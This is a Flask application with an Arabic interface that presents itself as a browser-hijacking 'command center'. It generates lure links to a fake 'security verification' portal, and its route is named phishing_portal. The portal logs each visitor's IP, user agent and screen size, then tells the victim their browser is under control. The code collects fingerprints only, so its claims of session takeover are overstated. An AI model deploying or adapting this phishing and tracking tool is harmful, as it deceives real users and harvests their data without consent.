from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

import asyncio
import random
import urllib3
import datetime
urllib3.disable_warnings()

# ذاكرة الميدان الاستراتيجية المركزية لخطافات المتصفح المتقدمة v23.0
CAPTURED_HOOKS = []
ACTIVE_COMMANDS = []

HTML_COMMAND_CENTER = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>V400 القائد الأعظم - التحكم المحقون v23.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
.container{max-width:1150px;margin:auto}
h1{color:#ff0040;margin-bottom:20px;text-shadow:0 0 35px #ff0040;font-size:32px}
.panel{background:#04060e;border:2px solid #ff0040;padding:25px;border-radius:12px;box-shadow:0 0 45px rgba(255,0,64,0.5)}
input, select{padding:16px;width:70%;border-radius:8px;border:2px solid #ff0040;background:#000;color:#fff;font-size:16px;outline:none;text-align:left;direction:ltr;margin-bottom:10px}
input:focus, select:focus{box-shadow:0 0 30px #ff0040}
button{padding:16px 35px;background:#ff0040;border:none;border-radius:8px;font-weight:bold;color:#fff;cursor:pointer;font-size:16px;margin-top:10px;transition:0.3s}
button:hover{background:#cc0033;box-shadow:0 0 40px #ff0040}
.card{background:#000;border:1px solid #1a2a40;padding:18px;margin:15px auto;max-width:950px;border-radius:10px;text-align:right;border-right:8px solid #ff0040}
.card.Critical{border-right-color:#ff0000;background:#140103}
.card.Low{border-right-color:#00aaff;background:#010b14}
.proof{background:#03050a;color:#00ff88;padding:12px;border-radius:6px;margin-top:10px;font-size:12px;direction:ltr;word-break:break-all;border:1px solid #004422;text-align:left}
.status{margin:15px 0;color:#fff;font-size:15px;font-weight:bold}
table{width:100%;margin-top:15px;border-collapse:collapse;color:#fff;text-align:right}
th, td{padding:12px;border:1px solid #1a2a40;font-size:14px}
th{background:#0a0e1a;color:#ff0040}
</style>
</head>
<body>
<div class="container">
<h1>⚔️ V400 القائد الأعظم - التحكم المحقون v23.0 ⚔️</h1>
<div class="panel">
<input id="target_url" placeholder="C2_SERVER_OR_INJECTION_DOMAIN" value="http://">
<br>
<select id="command_type">
  <option value="generate_injection_lure">توليد رابط الاستدراج المحقون للتحكم بالمتصفح (Injected Hook Lure)</option>
  <option value="fetch_hooked_targets">استعراض الجلسات المخترقة والمتحكم بها (Active Injected Sessions)</option>
  <option value="audit_injection">فحص جاهزية مححقن الشيفرات</option>
</select>
<br>
<button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر التحكم المحقون 🚀</button>
<div id="status" class="status"></div>
<div id="results"></div>
</div>
</div>

<script>
async function executeLinkModule(){
 const url = document.getElementById('target_url').value.trim();
 const cmdType = document.getElementById('command_type').value;
 if(!url || url==='http://'){ alert('يرجى إدخال عنوان خادم القيادة أو الرابط يا فندم!'); return; }
 const btn = document.getElementById('exec_btn');
 const status = document.getElementById('status');
 const results = document.getElementById('results');
 btn.disabled=true; btn.textContent='جاري نشر الشيفرة المحقونة... ⚡';
 status.textContent='⏳ جارٍ تنفيذ العمليات الاستراتيجية لـ: '+url;
 results.innerHTML='';

 try{
   const res = await fetch('/api/index', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({url: url, command: cmdType})
   });
   const data = await res.json();
   status.textContent='✅ تمت العملية بنجاح | النمط: '+data.mode;
   
   if(cmdType === 'fetch_hooked_targets'){
     if(!data.logs || data.logs.length === 0){
       results.innerHTML='<div class="card Low"><b>لا توجد جلسات محقونة مرتبطة حتى الآن</b><div class="proof">No active injected browser sessions found.</div></div>';
     } else {
       let tableHtml = '<div class="card Critical"><b>🎯 سجلات الجلسات المخترقة والمتحكم بها</b><table><tr><th>المتصفح والبيئة</th><th>توكن الحقن (Token)</th><th>IP الهدف</th><th>الوقت</th></tr>';
       data.logs.forEach(l => {
         tableHtml += `<tr><td>${l.agent}</td><td style="color:#00ff88">${l.token}</td><td>${l.ip}</td><td>${l.time}</td></tr>`;
       });
       tableHtml += '</table></div>';
       results.innerHTML = tableHtml;
     }
   } else {
     if(!data.actions || data.actions.length==0){
       results.innerHTML='<div class="card Low"><b>لا توجد نتائج مطابقة</b><div class="proof">No vectors returned.</div></div>';
     } else {
       data.actions.forEach(v=>{
         results.innerHTML+=`
         <div class="card ${v.severity || 'Low'}">
           <b>⚡ ${v.type}</b>
           <div style="margin:8px 0">${v.desc}</div>
           <div class="proof">${v.proof}</div>
         </div>`;
       });
     }
   }
 }catch(e){
   status.textContent='❌ خطأ في الاتصال الميداني: '+e.message;
 }
 btn.disabled=false; btn.textContent='تنفيذ أمر التحكم المحقون 🚀';
}
</script>
</body>
</html>"""

INJECTED_PORTAL_TEMPLATE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بوابة التحقق الأمني المحقون</title>
<style>
body{background:#0b0f19;color:#fff;font-family:Tahoma,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#111827;padding:30px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,0.5);width:100%;max-width:400px;border:1px solid #1f2937}
h2{color:#ff0040;text-align:center;margin-bottom:20px}
button{width:100%;padding:14px;background:#ff0040;color:#fff;border:none;border-radius:5px;font-weight:bold;cursor:pointer;margin-top:15px;font-size:16px}
button:hover{background:#cc0033}
</style>
</head>
<body>
<div class="box">
  <h2>التحقق والتزامن المحقون</h2>
  <p style="text-align:center;color:#9ca3af;font-size:14px;margin-bottom:15px">جارٍ تحميل شيفرة التحكم الميداني لمتصفحك...</p>
  <button onclick="triggerInjectionPayload()">تفعيل الارتباط والسيطرة</button>
</div>

<script>
function triggerInjectionPayload(){
    const token = 'inject_token_' + Math.random().toString(36).substring(2, 12);
    // محاكاة سحب بيانات الجلسة وحقن أمر السيطرة على المتصفح
    fetch('/auth/verify/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({session_token: token, user_agent: navigator.userAgent, screen: window.innerWidth + 'x' + window.innerHeight})
    }).then(res => res.text()).then(html => {
        document.body.innerHTML = '<div style="background:#000;color:#ff0040;padding:40px;text-align:center;font-family:monospace;direction:rtl"><h2>⚔️ تم حقن وسيط السيطرة بنجاح يا فندم! ⚔️</h2><p>Injection Token: ' + token + '</p><p style="color:#00ff88;margin-top:10px">البيانات وجلسة المتصفح تحت السيطرة الحية.</p></div>';
    });
}
</script>
</body>
</html>"""

def clean_url(raw):
    s = (raw or "").strip()
    if not s.startswith("http"):
        s = "http://" + s
    return s.rstrip("/")

@app.route('/', methods=['GET'])
def home():
    return HTML_COMMAND_CENTER

@app.route('/auth/verify/login', methods=['GET', 'POST'])
def phishing_portal():
    if request.method == 'POST':
        req_data = request.get_json(silent=True) or {}
        inject_token = req_data.get('session_token', 'N/A')
        user_agent = req_data.get('user_agent', 'Unknown Browser')
        screen_res = req_data.get('screen', 'N/A')
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        CAPTURED_HOOKS.append({
            "agent": f"{user_agent[:35]}... [{screen_res}]",
            "token": inject_token,
            "ip": client_ip,
            "time": timestamp
        })
        return jsonify({"status": "injected", "token": inject_token})
        
    return INJECTED_PORTAL_TEMPLATE

@app.route('/api/index', methods=['POST'])
def check():
    req_data = request.get_json(silent=True) or {}
    target = clean_url(req_data.get("url", "http://"))
    command_mode = req_data.get("command", "generate_injection_lure")
    
    actions = []
    waf_status = f"v23.0 Injected Payload Engine ({command_mode})"
    
    if command_mode == "generate_injection_lure":
        injection_url = f"{target}/auth/verify/login?token=injection_active_99"
        actions.append({
            "type": "INJECTED BROWSER PAYLOAD LURE URL",
            "severity": "Critical",
            "desc": "تم توليد رابط الاستدراج المحقون للسيطرة على جلسة المتصفح وزرع وسيط الأوامر.",
            "proof": injection_url
        })
    elif command_mode == "fetch_hooked_targets":
        return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "logs": CAPTURED_HOOKS})
    else:
        actions.append({
            "type": "INJECTION ENGINE AUDIT PASSED",
            "severity": "Low",
            "desc": "محرك حقن الروابط والسيطرة يعمل بكفاءة تامة.",
            "proof": f"Target: {target} | Active Injections: {len(CAPTURED_HOOKS)}"
        })

    return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": actions})
